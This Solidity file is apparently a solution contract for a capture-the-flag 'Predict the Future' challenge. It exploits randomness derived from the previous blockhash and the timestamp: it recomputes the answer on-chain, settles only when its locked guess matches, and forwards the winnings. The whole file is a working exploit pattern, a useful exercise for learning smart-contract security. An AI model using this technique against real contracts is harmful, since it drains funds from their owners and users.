pragma solidity 0.4.24;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) public payable;

    function settle() public;
}

contract PredictTheFutureChallengeSolver {
    uint8 guess;

    function enterGuess(address challenge, uint8 _guess) public payable {
        require(msg.value == 1 ether, 'msg.value');

        IPredictTheFutureChallenge instance = IPredictTheFutureChallenge(challenge);
        instance.lockInGuess.value(msg.value)(_guess);

        guess = _guess;
    }

    function solveChallenge(address challenge) public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require(answer == guess, 'answer != guess');

        IPredictTheFutureChallenge instance = IPredictTheFutureChallenge(challenge);
        instance.settle();

        // revert if reward not received
        require(address(this).balance >= 2 ether, 'eth not received');
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
